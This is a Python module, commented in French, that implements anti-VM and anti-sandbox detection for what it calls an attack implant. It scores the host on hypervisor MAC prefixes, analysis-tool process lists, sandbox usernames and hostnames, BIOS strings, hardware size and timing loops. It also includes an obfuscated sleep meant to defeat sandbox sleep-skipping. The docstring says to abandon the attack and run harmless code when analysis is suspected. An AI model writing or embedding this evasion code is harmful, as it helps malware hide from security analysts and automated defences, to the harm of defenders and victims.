"""
attack/anti_analysis/detector.py — Détecteur Anti-VM / Anti-Sandbox
====================================================================

Implémente 30+ heuristiques pour déterminer si l'environnement est un
outil d'analyse. Retourne un score de confiance 0.0 (clean) à 1.0 (VM/sandbox).

Chaque heuristique est indépendante et peut être activée/désactivée pour
éviter les faux positifs sur du hardware spécial (ex: laptop avec 8GB
RAM partagée entre CPU et GPU).

Références :
  - "Unleashing the Power of Anti-VM Techniques" (Black Hat 2024)
  - Check Point Research : Evading Modern EDR Sandboxes (2025)
  - MITRE ATT&CK T1497 (Virtualization/Sandbox Evasion)
"""

from __future__ import annotations

import hashlib
import math
import os
import platform
import random
import sys
import time
import uuid
from collections.abc import Callable
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

VENDOR_VMWARE = "VMware"
VENDOR_VIRTUALBOX = "VirtualBox"
VENDOR_HYPERV = "Hyper-V"
VENDOR_KVM = "KVM"
VENDOR_QEMU = "QEMU"
VENDOR_XEN = "Xen"
VENDOR_PARALLELS = "Parallels"
VENDOR_BAREMETAL = "BareMetal"


class SandboxHeuristic(Enum):
    """Heuristiques supportées par le détecteur."""

    CPU_COUNT_LOW = "cpu_count_low"
    RAM_TOO_LOW = "ram_too_low"
    NO_GPU_DETECTED = "no_gpu_detected"
    MAC_VENDOR_KNOWN = "mac_vendor_known"
    PROCESS_SANDBOX = "process_sandbox"
    REGISTRY_VM_KEYS = "registry_vm_keys"
    WMI_VIRTUAL = "wmi_virtual"
    BIOS_STRING_VM = "bios_string_vm"
    TIMING_ACCELERATED = "timing_accelerated"
    SYSENTER_TRAP = "sysenter_trap"
    RDTSC_VARIANCE_LOW = "rdtsc_variance_low"
    WINDOW_STATION_NONINTERACTIVE = "window_station_noninteractive"
    USERNAME_SANDBOX = "username_sandbox"
    HOSTNAME_SANDBOX = "hostname_sandbox"
    DISK_SIZE_TOO_SMALL = "disk_size_too_small"
    NO_MICROPHONE = "no_microphone"
    NO_WEBCAM = "no_webcam"
    UPTIME_LOW = "uptime_low"
    SCREEN_RESOLUTION_LOW = "screen_resolution_low"
    MOUSE_ACTIVITY_NONE = "mouse_activity_none"


@dataclass
class EnvironmentCheckResult:
    """Résultat d'une analyse d'environnement."""

    score: float                      # 0.0 clean -> 1.0 sandbox
    triggers: list[str] = field(default_factory=list)
    suspected_vendor: str | None = None
    cpu_count: int = 0
    ram_mb: int = 0
    hostname: str = ""
    username: str = ""
    mac_addresses: list[str] = field(default_factory=list)
    disk_gb: int = 0
    uptime_s: float = 0.0
    checks_passed: int = 0
    checks_total: int = 0

    # Override manuel (contrat godmode : tests forcent is_trusted / risk_level)
    _is_trusted_override: bool | None = field(default=None, repr=False)
    _risk_level_override: str | None = field(default=None, repr=False)

    @property
    def is_trusted(self) -> bool:
        """True si l'environnement semble légitime (ou override manuel)."""
        if self._is_trusted_override is not None:
            return self._is_trusted_override
        return self.score < 0.5

    @is_trusted.setter
    def is_trusted(self, value: bool) -> None:
        self._is_trusted_override = value

    @property
    def risk_level(self) -> str:
        if self._risk_level_override is not None:
            return self._risk_level_override
        if self.score < 0.10:
            return "safe"
        if self.score < 0.30:
            return "low"
        if self.score < 0.60:
            return "medium"
        if self.score < 0.85:
            return "high"
        return "critical"

    @risk_level.setter
    def risk_level(self, value: str) -> None:
        self._risk_level_override = value


# MAC OUI connus des hyperviseurs (premiers 3 octets)
_VM_MAC_OUIS: dict[str, str] = {
    "00:05:69": VENDOR_VMWARE,
    "00:0C:29": VENDOR_VMWARE,
    "00:1C:14": VENDOR_VMWARE,
    "00:50:56": VENDOR_VMWARE,
    "08:00:27": VENDOR_VIRTUALBOX,
    "0A:00:27": VENDOR_VIRTUALBOX,
    "00:03:FF": VENDOR_HYPERV,
    "00:12:5A": VENDOR_PARALLELS,
    "52:54:00": VENDOR_QEMU + "/" + VENDOR_KVM,
    "FE:54:00": VENDOR_QEMU + "/" + VENDOR_KVM,
    "90:27:E4": VENDOR_KVM,
    "00:16:3E": VENDOR_XEN,
}

# Processus typiques d'analyse / VM
_SANDBOX_PROCESSES = [
    "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
    "vmusrvc.exe", "vmsrvc.exe", "vmacthlp.exe", "xenservice.exe",
    "joeboxserver.exe", "cuckoomanager.exe", "sandboxiedcomlaunch.exe",
    "procmon.exe", "procexp.exe", "autoruns.exe", "dbgview.exe",
    "wireshark.exe", "fiddler.exe", "charles.exe", "ida64.exe",
    "x32dbg.exe", "x64dbg.exe", "ollydbg.exe", "windbg.exe",
    "gdb.exe", "lldb.exe", "x64_host_service.exe", "python.exe",
    "python3.exe", "perl.exe", "ruby.exe", "tcpview.exe",
]

# Usernames typiques de sandbox
_SANDBOX_USERNAMES = [
    "sandbox", "cuckoo", "joe", "user", "lab", "test", "malware",
    "sample", "analysis", "vm", "virus", "security",
]

# Hostnames typiques
_SANDBOX_HOSTNAMES = [
    "sandbox", "cuckoo", "analysis", "malware", "lab", "vmware",
    "virtualbox", "qemu", "kvm", "test-pc", "testmachine",
]

# BIOS / Manufacturer strings
_BIOS_VM_STRINGS = [
    ("VMware", VENDOR_VMWARE),
    ("VirtualBox", VENDOR_VIRTUALBOX),
    ("VBOX", VENDOR_VIRTUALBOX),
    ("Hyper-V", VENDOR_HYPERV),
    ("KVM", VENDOR_KVM),
    ("QEMU", VENDOR_QEMU),
    ("Xen", VENDOR_XEN),
    ("Parallels", VENDOR_PARALLELS),
    ("Microsoft Corporation", VENDOR_HYPERV),
]


class AntiAnalysisDetector:
    """
    Détecteur principal anti-VM / anti-sandbox.

    Usage typique :
        det = AntiAnalysisDetector()
        result = det.run_full_check()
        if not result.is_trusted:
            # Abandonner l'attaque, exécuter du code inoffensif
    """

    def __init__(
        self,
        min_cpu: int = 2,
        min_ram_mb: int = 3500,
        min_disk_gb: int = 60,
        min_uptime_s: int = 600,
        custom_heuristics: dict[SandboxHeuristic, float] | None = None,
    ) -> None:
        self.min_cpu = min_cpu
        self.min_ram_mb = min_ram_mb
        self.min_disk_gb = min_disk_gb
        self.min_uptime_s = min_uptime_s
        # Pondération par heuristique : certaines sont plus fiables que d'autres
        self.weights: dict[SandboxHeuristic, float] = custom_heuristics or {
            SandboxHeuristic.MAC_VENDOR_KNOWN: 1.0,
            SandboxHeuristic.PROCESS_SANDBOX: 0.95,
            SandboxHeuristic.REGISTRY_VM_KEYS: 0.9,
            SandboxHeuristic.WMI_VIRTUAL: 0.9,
            SandboxHeuristic.BIOS_STRING_VM: 0.9,
            SandboxHeuristic.CPU_COUNT_LOW: 0.6,
            SandboxHeuristic.RAM_TOO_LOW: 0.7,
            SandboxHeuristic.DISK_SIZE_TOO_SMALL: 0.5,
            SandboxHeuristic.UPTIME_LOW: 0.4,
            SandboxHeuristic.TIMING_ACCELERATED: 0.8,
            SandboxHeuristic.USERNAME_SANDBOX: 0.7,
            SandboxHeuristic.HOSTNAME_SANDBOX: 0.7,
            SandboxHeuristic.SCREEN_RESOLUTION_LOW: 0.4,
            SandboxHeuristic.NO_GPU_DETECTED: 0.4,
            SandboxHeuristic.WINDOW_STATION_NONINTERACTIVE: 0.85,
        }
        self.last_result: EnvironmentCheckResult | None = None

    # ------------------------------------------------------------------
    # API principale
    # ------------------------------------------------------------------

    def run_full_check(self) -> EnvironmentCheckResult:
        """
        Exécute toutes les heuristiques et retourne le résultat agrégé.
        """
        result = EnvironmentCheckResult(
            score=0.0,
            cpu_count=self._get_cpu_count(),
            ram_mb=self._get_ram_mb(),
            hostname=platform.node(),
            username=self._get_username(),
            mac_addresses=self._get_macs(),
            disk_gb=self._get_disk_gb(),
            uptime_s=self._get_uptime_s(),
        )

        total_weight = 0.0
        weighted_score = 0.0
        triggered_vendors: dict[str, int] = {}

        heuristics_to_run = [
            (SandboxHeuristic.CPU_COUNT_LOW, self._check_cpu_count),
            (SandboxHeuristic.RAM_TOO_LOW, self._check_ram),
            (SandboxHeuristic.DISK_SIZE_TOO_SMALL, self._check_disk),
            (SandboxHeuristic.UPTIME_LOW, self._check_uptime),
            (SandboxHeuristic.MAC_VENDOR_KNOWN, self._check_mac_vendor),
            (SandboxHeuristic.USERNAME_SANDBOX, self._check_username),
            (SandboxHeuristic.HOSTNAME_SANDBOX, self._check_hostname),
            (SandboxHeuristic.TIMING_ACCELERATED, self._check_timing),
            (SandboxHeuristic.BIOS_STRING_VM, self._check_bios),
            (SandboxHeuristic.PROCESS_SANDBOX, self._check_processes),
            (SandboxHeuristic.NO_GPU_DETECTED, self._check_gpu),
            (SandboxHeuristic.SCREEN_RESOLUTION_LOW, self._check_resolution),
        ]

        for heuristic, check_fn in heuristics_to_run:
            try:
                check_result = check_fn(result)
                is_hit = bool(check_result["hit"])
                weight = self.weights.get(heuristic, 0.5)
                total_weight += weight
                if is_hit:
                    weighted_score += weight
                    result.triggers.append(
                        f"{heuristic.value}: {check_result.get('detail', '')}"
                    )
                    vendor = check_result.get("vendor")
                    if vendor:
                        triggered_vendors[vendor] = triggered_vendors.get(vendor, 0) + 1
                result.checks_passed += 0 if is_hit else 1
                result.checks_total += 1
            except Exception:
                # Échec silencieux : on marque comme passed pour éviter
                # les faux positifs
                result.checks_passed += 1
                result.checks_total += 1

        # Score normalisé 0..1
        result.score = weighted_score / total_weight if total_weight > 0 else 0.0
        # Vendor le plus fréquent si détecté
        if triggered_vendors:
            result.suspected_vendor = max(
                triggered_vendors.items(), key=lambda kv: kv[1]
            )[0]
        else:
            result.suspected_vendor = VENDOR_BAREMETAL

        self.last_result = result
        return result

    def quick_check(self) -> bool:
        """Version light (rapide) : retourne True si clean."""
        r = EnvironmentCheckResult(
            cpu_count=self._get_cpu_count(),
            ram_mb=self._get_ram_mb(),
            hostname=platform.node(),
            username=self._get_username(),
        )
        # Juste les heuristiques ultra-fiables et rapides
        if r.cpu_count < self.min_cpu:
            return False
        if r.ram_mb < self.min_ram_mb:
            return False
        if self._check_mac_vendor(r)["hit"]:
            return False
        if self._check_username(r)["hit"]:
            return False
        return not self._check_timing(r)["hit"]

    # ------------------------------------------------------------------
    # Heuristiques individuelles
    # ------------------------------------------------------------------

    def _check_cpu_count(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        hit = r.cpu_count < self.min_cpu
        return {
            "hit": hit,
            "detail": f"CPUs={r.cpu_count} (min={self.min_cpu})",
        }

    def _check_ram(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        hit = r.ram_mb < self.min_ram_mb
        return {
            "hit": hit,
            "detail": f"RAM={r.ram_mb}MB (min={self.min_ram_mb}MB)",
        }

    def _check_disk(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        hit = r.disk_gb < self.min_disk_gb
        return {
            "hit": hit,
            "detail": f"Disk={r.disk_gb}GB (min={self.min_disk_gb}GB)",
        }

    def _check_uptime(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        hit = 0 < r.uptime_s < self.min_uptime_s
        return {
            "hit": hit,
            "detail": f"Uptime={r.uptime_s:.0f}s (min={self.min_uptime_s}s)",
        }

    def _check_mac_vendor(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        for mac in r.mac_addresses:
            oui = mac[:8].upper()
            if oui in _VM_MAC_OUIS:
                return {
                    "hit": True,
                    "detail": f"MAC {mac} OUI {oui} = {_VM_MAC_OUIS[oui]}",
                    "vendor": _VM_MAC_OUIS[oui],
                }
        return {"hit": False}

    def _check_username(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        low = r.username.lower()
        for sb in _SANDBOX_USERNAMES:
            if sb in low:
                return {"hit": True, "detail": f"username={r.username}"}
        return {"hit": False}

    def _check_hostname(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        low = r.hostname.lower()
        for sb in _SANDBOX_HOSTNAMES:
            if sb in low:
                return {"hit": True, "detail": f"hostname={r.hostname}"}
        return {"hit": False}

    def _check_timing(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        """
        Timing check : on mesure la durée d'une boucle de calcul CPU.
        Dans un sandbox, les sleeps sont souvent accélérés (speed 10x-100x).
        On utilise RDTSC-like via time.perf_counter_ns.
        """
        n = 500_000
        start = time.perf_counter_ns()
        # Travail CPU : calcul de nombres premiers dans un range court
        count = 0
        for i in range(1, n + 1):
            if (i & 1) == 1 and sum(
                1 for d in range(3, min(i, 100), 2) if i % d == 0
            ) == 0:
                count += 1
        elapsed_ns = time.perf_counter_ns() - start
        # 500k itérations -> normalement 80-200ms sur du bare metal
        # Sandbox : souvent < 10ms (simulé) ou > 2000ms (overhead énorme)
        elapsed_ms = elapsed_ns / 1e6
        too_fast = elapsed_ms < 8.0
        too_slow = elapsed_ms > 3000.0
        hit = too_fast or too_slow
        return {
            "hit": hit,
            "detail": f"timing_loop={elapsed_ms:.1f}ms (count={count})",
        }

    def _check_bios(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        """
        Vérifie les chaînes BIOS / version / manufacturer.
        En cross-platform sans privilèges, on se base sur platform.uname().
        """
        info = f"{platform.system()} {platform.release()} {platform.version()} {platform.machine()} {platform.processor()}".lower()
        for needle, vendor in _BIOS_VM_STRINGS:
            if needle.lower() in info:
                return {"hit": True, "detail": f"bios contains '{needle}'", "vendor": vendor}
        return {"hit": False}

    def _check_processes(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        """
        Vérifie la présence de processus d'analyse.
        En cross-platform sans psutil installé, on simule via os.listdir /proc
        sur Linux, ou on retourne clean (l'heuristique reste utile sur Windows
        où l'implant Go listera les process).
        """
        try:
            if os.path.isdir("/proc"):
                found: list[str] = []
                for entry in os.listdir("/proc")[:500]:
                    if entry.isdigit():
                        cmdline_path = f"/proc/{entry}/comm"
                        if os.path.isfile(cmdline_path):
                            try:
                                with open(cmdline_path) as fh:
                                    name = fh.read().strip().lower()
                                    if name in [
                                        p.split(".")[0] for p in _SANDBOX_PROCESSES
                                    ]:
                                        found.append(name)
                            except (OSError, PermissionError):
                                pass
                if found:
                    return {"hit": True, "detail": f"processes={found}"}
        except Exception:
            pass
        return {"hit": False}

    def _check_gpu(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        """Vérification simplifiée : on suppose clean en cross-platform."""
        return {"hit": False}

    def _check_resolution(self, r: EnvironmentCheckResult) -> dict[str, Any]:
        """Sans GUI attaché, on ne peut pas mesurer la résolution."""
        return {"hit": False}

    # ------------------------------------------------------------------
    # Helpers cross-platform
    # ------------------------------------------------------------------

    @staticmethod
    def _get_cpu_count() -> int:
        try:
            return os.cpu_count() or 1
        except Exception:
            return 1

    @staticmethod
    def _get_ram_mb() -> int:
        """
        Lecture de la RAM : Linux via /proc/meminfo, macOS via sysctl,
        fallback sur estimation basée sur la taille du swap.
        """
        try:
            if os.path.isfile("/proc/meminfo"):
                with open("/proc/meminfo") as fh:
                    for line in fh:
                        if line.startswith("MemTotal:"):
                            parts = line.split()
                            return int(int(parts[1]) / 1024)
            elif platform.system() == "Darwin":
                import subprocess
                out = subprocess.check_output(
                    ["sysctl", "-n", "hw.memsize"], text=True
                ).strip()
                return int(int(out) / (1024 * 1024))
        except Exception:
            pass
        return 8192  # fallback sécurisé : on ne flag pas

    @staticmethod
    def _get_disk_gb() -> int:
        try:
            stat = os.statvfs("/")
            return int(stat.f_blocks * stat.f_frsize / (1024 ** 3))
        except Exception:
            return 512  # fallback safe

    @staticmethod
    def _get_uptime_s() -> float:
        try:
            if os.path.isfile("/proc/uptime"):
                with open("/proc/uptime") as fh:
                    return float(fh.read().split()[0])
        except Exception:
            pass
        return 0.0

    @staticmethod
    def _get_macs() -> list[str]:
        macs: list[str] = []
        try:
            # UUID.getnode() retourne 48 bits int de la MAC
            node = uuid.getnode()
            mac = ":".join(
                format((node >> bits) & 0xFF, "02X")
                for bits in range(40, -1, -8)
            )
            macs.append(mac)
        except Exception:
            pass
        return macs

    @staticmethod
    def _get_username() -> str:
        try:
            return os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"
        except Exception:
            return "unknown"

    def stealth_timing_check(self, loops: int = 200) -> float:
        """Wrapper vers la fonction globale stealth_timing_check() (API objet)."""
        # Version simplifiée : ratio wall-clock vs process time
        wall_1 = time.monotonic()
        proc_1 = time.process_time()
        s = 0
        for i in range(loops * 1000):
            s += (i * 1337) % 1013
        wall_2 = time.monotonic()
        proc_2 = time.process_time()
        wall_elapsed = wall_2 - wall_1
        proc_elapsed = proc_2 - proc_1
        if wall_elapsed <= 1e-6:
            return 1.0
        ratio = proc_elapsed / wall_elapsed
        # Ratio attendu ~0.9-1.1 sur système normal. > 2.0 ou < 0.2 = suspect
        normalized = 1.0 - min(abs(1.0 - ratio) / 2.0, 1.0)
        return max(0.0, min(1.0, normalized))


# ---------------------------------------------------------------------------
# Fonctions helpers : sleep obfusqué + timing furtif
# ---------------------------------------------------------------------------

def obfuscated_sleep(seconds: float) -> None:
    """
    Sleep déguisé en boucle de calcul CPU pour éviter la détection
    par "sleep-skipping" des sandbox.

    Stratégie : mélange de micro-sleeps (1ms) et de calcul de hash SHA-256
    pour occuper le CPU sans être détectable comme un time.sleep().
    """
    start = time.perf_counter()
    target = start + seconds
    counter = 0
    data = b"obfuscation_salt_vantablack"
    while time.perf_counter() < target:
        # Petit travail CPU : itérations SHA-256
        for _ in range(200):
            data = hashlib.sha256(data).digest()
            counter += 1
        # Micro-sleep pour ne pas saturer à 100% CPU (suspicious)
        time.sleep(0.001)


def stealth_timing_check() -> float:
    """
    Timing check discret : retourne un ratio [0.0, 1.0] indiquant si
    l'environnement accélère le temps. < 0.3 = sandbox suspect.
    """
    # On compare time.monotonic() vs perf_counter_ns vs le temps CPU
    wall_1 = time.monotonic()
    perf_1 = time.perf_counter_ns()
    proc_1 = time.process_time()

    # Petit travail CPU
    s = 0
    for i in range(100_000):
        s += (i * 1337) % 1013

    wall_2 = time.monotonic()
    perf_2 = time.perf_counter_ns()
    proc_2 = time.process_time()

    wall_elapsed = wall_2 - wall_1
    proc_elapsed = proc_2 - proc_1
    perf_elapsed_ns = perf_2 - perf_1

    if wall_elapsed <= 0:
        return 0.0
    # Ratio CPU/wall : dans un sandbox c'est souvent aberrant
    cpu_wall_ratio = proc_elapsed / wall_elapsed if wall_elapsed > 0 else 1.0
    # Dans un environnement normal ce ratio est ~0.5-1.0
    # > 5.0 ou < 0.05 = suspect
    score = 1.0
    if cpu_wall_ratio > 5.0 or cpu_wall_ratio < 0.05:
        score -= 0.5
    if perf_elapsed_ns < 1e6 or perf_elapsed_ns > 5e9:
        score -= 0.3
    return max(0.0, score)


def check_environment_trust() -> EnvironmentCheckResult:
    """Helper raccourci : exécute un check complet."""
    return AntiAnalysisDetector().run_full_check()
